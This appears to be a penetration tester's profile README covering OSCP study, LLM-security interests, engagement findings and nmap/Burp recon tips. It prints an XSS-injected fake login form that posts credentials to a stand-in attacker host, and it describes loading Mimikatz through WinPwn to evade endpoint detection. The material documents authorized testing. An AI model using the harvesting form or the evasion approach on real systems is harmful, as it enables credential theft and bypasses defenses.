## Currently

- 🎯 Preparing for the **OSCP** (expected Dec 2026)
- 🤖 Building small AI agent tooling — experimenting with tool/function calling and exploring how LLM-assisted workflows fit into a pentest methodology.
- 🔍 Digging into **LLM security** — prompt injection and system-prompt leakage on the offensive side, alongside sanitization practices for safely feeding engagement data into AI tools
<br>


## Selected Findings

### XSS → Credential Harvesting Demo

I found a reflected XSS vulnerability on an anonymously-accessible endpoint and was asked to demonstrate real-world impact. Since there was no login session to hijack, I used HTML injection to render a spoofed login form in its place — showing the client how easily user credentials could be harvested. I also walked a teammate through the approach as a quick knowledge-share.


```html
<form action="https://attacker-controlled.example/collect" method="POST">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Sign In</button>
</form>
```



<br>


### Mimikatz Execution on a Hardened Endpoint via WinPwn

I was provided a well-hardened endpoint to test.  Direct Mimikatz execution was reliably blocked, even after trying several AMSI-bypass techniques (including a number from [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), which — unsurprisingly — were already well signatured). I pivoted to [WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn), a broader enumeration and exploitation toolkit, which loads Mimikatz indirectly rather than invoking it directly. That indirection was enough to slip past the endpoint's detection and get it running.

**Takeaway:** Direct signature-based blocks on known tools like Mimikatz don't always account for tools that load them as a dependency rather than invoking them by name — a useful reminder when evaluating EDR coverage.
<br><br>
## Tips

### Enumerate Web Sites via SSL Certificate

When scanning a network range, the `commonName` field in SSL certs often reveals hostnames that wouldn't otherwise surface in a basic port scan — useful for building out a target list quickly.

```bash
nmap -Pn -p 443 --script ssl-cert 10.0.0.250-253 | grep -e "commonName"
```

### Getting a Large Number of Web Sites into Burp

For quickly funneling a whole subnet's worth of web servers into Burp's site map without manually browsing to each one:

1. Scan the network for common web ports and output in greppable format:
```bash
   nmap -p 80,443 10.0.0.0/24 -oG net.scan
```
2. Open Burp and have it listening for incoming proxy traffic.
3. Loop through the discovered hosts, routing each request through the Burp proxy:
```bash
   for i in $(grep '/open/' net.scan | awk '{print $2}'); do
     curl -sk --proxy localhost:8080 https://$i
   done
```




